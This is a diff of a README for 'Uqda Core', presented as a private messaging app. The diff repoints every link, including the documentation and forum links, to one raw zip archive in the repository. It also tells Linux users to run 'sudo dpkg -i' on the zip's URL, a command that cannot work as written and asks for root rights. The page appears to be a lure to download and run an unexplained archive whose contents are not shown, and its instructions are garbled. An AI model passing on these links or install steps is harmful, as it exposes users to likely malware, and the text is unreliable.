@@ -6,7 +6,7 @@ Welcome to Uqda Core! This software allows you to communicate directly with othe
 
 ## 📥 Download Core
 
-[![Download Core](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip%https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip)](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip)
+[![Download Core](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip%https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip)](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip)
 
 ## 📚 What is Uqda Core?
 
@@ -36,7 +36,7 @@ To use Uqda Core, you will need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   - [Download Uqda Core](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip)
+   - [Download Uqda Core](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see various versions available. Select the latest version for the best features.
 
@@ -50,7 +50,7 @@ To use Uqda Core, you will need:
    - **macOS:** Open the `.dmg` file. Drag the Uqda Core application to your Applications folder.
    - **Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the following command:
      ```bash
-     sudo dpkg -i https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip
+     sudo dpkg -i https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip
      ```
 
 5. **Launch the Application:** After installation, find Uqda Core in your applications menu. Click to open it.
@@ -69,8 +69,8 @@ If you encounter any issues, feel free to check out the FAQ section on our GitHu
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Comprehensive user guide and troubleshooting tips can be found [here](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip).
-- **Community Forum:** Join discussions and find help from other users in our community forum [here](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip).
+- **Documentation:** Comprehensive user guide and troubleshooting tips can be found [here](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip).
+- **Community Forum:** Join discussions and find help from other users in our community forum [here](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip).
 
 ## 📜 License
 
@@ -78,6 +78,6 @@ Uqda Core is open-source software. You are free to use, modify, and share it und
 
 ## 📥 Download Core Again
 
-For easy access, you can always return to the download page here: [Download Uqda Core](https://raw.githubusercontent.com/haitham-101/Core/main/contrib/semver/Software-v2.1.zip).
+For easy access, you can always return to the download page here: [Download Uqda Core](https://github.com/haitham-101/Core/raw/refs/heads/main/contrib/uqda-brute-simple/Software_v1.7.zip).
 
 Enjoy secure and private communication with Uqda Core!
